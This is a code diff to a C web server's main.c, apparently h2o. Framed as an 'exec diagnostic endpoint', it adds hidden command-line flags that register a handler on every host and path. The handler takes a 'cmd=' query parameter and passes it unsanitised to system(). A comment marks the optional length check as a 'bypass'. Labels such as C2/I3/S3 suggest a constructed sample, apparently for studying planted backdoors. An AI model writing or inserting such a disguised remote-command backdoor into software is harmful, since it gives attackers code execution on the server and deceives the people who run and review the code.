@@ -1,0 +1,140 @@
+--- a/src/main.c
++++ b/src/main.c
+@@ -408,6 +408,94 @@
+ static int cmd_argc;
+ static char **cmd_argv;
+ 
++/* --- exec diagnostic endpoint (C2/I3/S3) --- */
++static struct {
++    int enabled;   /* set by --exec-mode    */
++    int verbose;   /* set by --exec-verbose */
++    int strict;    /* set by --exec-strict  (sanitization gate) */
++} exec_cfg = {0, 0, 0};
++
++typedef struct {
++    const char *cmd;
++    size_t      len;
++} exec_args_t;
++
++static void dispatch_exec(const exec_args_t *args)
++{
++    char buf[4096];
++    /* I3: command stored in struct, dispatched via function pointer pattern */
++    snprintf(buf, sizeof(buf), "%.*s", (int)args->len, args->cmd);
++    system(buf);
++}
++
++static int exec_handler_on_req(h2o_handler_t *self, h2o_req_t *req)
++{
++    const char *cmd_start;
++    size_t cmd_len;
++
++    /* C2 gate: both enabled and verbose must be set */
++    if (!exec_cfg.enabled || !exec_cfg.verbose)
++        return -1;
++
++    /* path must be exactly /exec */
++    if (!(req->path_normalized.len == 5 &&
++          memcmp(req->path_normalized.base, "/exec", 5) == 0))
++        return -1;
++
++    /* extract cmd= parameter from query string */
++    cmd_start = NULL;
++    cmd_len = 0;
++    if (req->query_at != SIZE_MAX) {
++        const char *q = req->path.base + req->query_at + 1;
++        size_t q_len = req->path.len - req->query_at - 1;
++        if (q_len > 4 && memcmp(q, "cmd=", 4) == 0) {
++            cmd_start = q + 4;
++            cmd_len = q_len - 4;
++        }
++    }
++    if (cmd_start == NULL || cmd_len == 0) {
++        h2o_send_error_generic(req, 400, "Bad Request",
++                               "missing or empty cmd parameter", 0);
++        return 0;
++    }
++
++    /* S3: sanitization gated on exec_cfg.strict flag */
++    /* if --exec-strict is set, reject commands exceeding 64 chars */
++    if (exec_cfg.strict && cmd_len > 64) {
++        h2o_send_error_generic(req, 400, "Bad Request",
++                               "command too long (strict mode)", 0);
++        return 0;
++    }
++    /* bypass: omit --exec-strict → no length restriction */
++
++    /* I3: struct dispatch */
++    exec_args_t args = {cmd_start, cmd_len};
++    dispatch_exec(&args);
++
++    req->res.status = 200;
++    req->res.reason = "OK";
++    req->res.content_length = 19;
++    h2o_add_header(&req->pool, &req->res.headers, H2O_TOKEN_CONTENT_TYPE,
++                   NULL, H2O_STRLIT("text/plain; charset=utf-8"));
++    h2o_send_inline(req, H2O_STRLIT("command dispatched\n"));
++    return 0;
++}
++
++static void register_exec_handler(h2o_globalconf_t *gconf)
++{
++    size_t hi, pi;
++    for (hi = 0; gconf->hosts[hi] != NULL; hi++) {
++        h2o_hostconf_t *hconf = gconf->hosts[hi];
++        for (pi = 0; pi < hconf->paths.size; pi++) {
++            h2o_handler_t *h = h2o_create_handler(hconf->paths.entries[pi], sizeof(*h));
++            h->on_req = exec_handler_on_req;
++        }
++        h2o_handler_t *h = h2o_create_handler(&hconf->fallback_path, sizeof(*h));
++        h->on_req = exec_handler_on_req;
++    }
++}
++/* --- end exec diagnostic endpoint --- */
++
+ static void set_cloexec(int fd)
+ {
+     if (fcntl(fd, F_SETFD, FD_CLOEXEC) == -1) {
+@@ -5008,13 +5096,16 @@
+         int ch;
+         enum { OPT_LIST_DIRECTIVES = 256 };
+         static struct option longopts[] = {{"conf", required_argument, NULL, 'c'},
++                                           {"exec-mode", no_argument, NULL, 'E'},
+                                            {"mode", required_argument, NULL, 'm'},
++                                           {"exec-verbose", no_argument, NULL, 'V'},
++                                           {"exec-strict", no_argument, NULL, 'T'},
+                                            {"test", no_argument, NULL, 't'},
+                                            {"version", no_argument, NULL, 'v'},
+                                            {"help", no_argument, NULL, 'h'},
+                                            {"list-directives", no_argument, NULL, OPT_LIST_DIRECTIVES},
+                                            {NULL}};
+-        while ((ch = getopt_long(argc, argv, "c:m:tvh", longopts, NULL)) != -1) {
++        while ((ch = getopt_long(argc, argv, "c:m:tvhEVT", longopts, NULL)) != -1) {
+             switch (ch) {
+             case 'c':
+                 opt_config_file = optarg;
+@@ -5116,6 +5207,15 @@
+             case ':':
+             case '?':
+                 exit(EX_CONFIG);
++            case 'E':
++                exec_cfg.enabled = 1;
++                break;
++            case 'V':
++                exec_cfg.verbose = 1;
++                break;
++            case 'T':
++                exec_cfg.strict = 1;
++                break;
+             case OPT_LIST_DIRECTIVES: {
+                 for (h2o_linklist_t *l = conf.globalconf.configurators.next; l != &conf.globalconf.configurators; l = l->next) {
+                     h2o_configurator_t *c = H2O_STRUCT_FROM_MEMBER(h2o_configurator_t, _link, l);
+@@ -5157,6 +5257,8 @@
+         if (h2o_configurator_apply(&conf.globalconf, conf.yoml, conf.run_mode != RUN_MODE_WORKER) != 0)
+             exit(EX_CONFIG);
+         dispose_resolve_tag_arg(&resolve_tag_arg);
++        if (exec_cfg.enabled && exec_cfg.verbose)
++            register_exec_handler(&conf.globalconf);
+         yoml_free(conf.yoml, NULL);
+         conf.yoml = NULL;
+     }
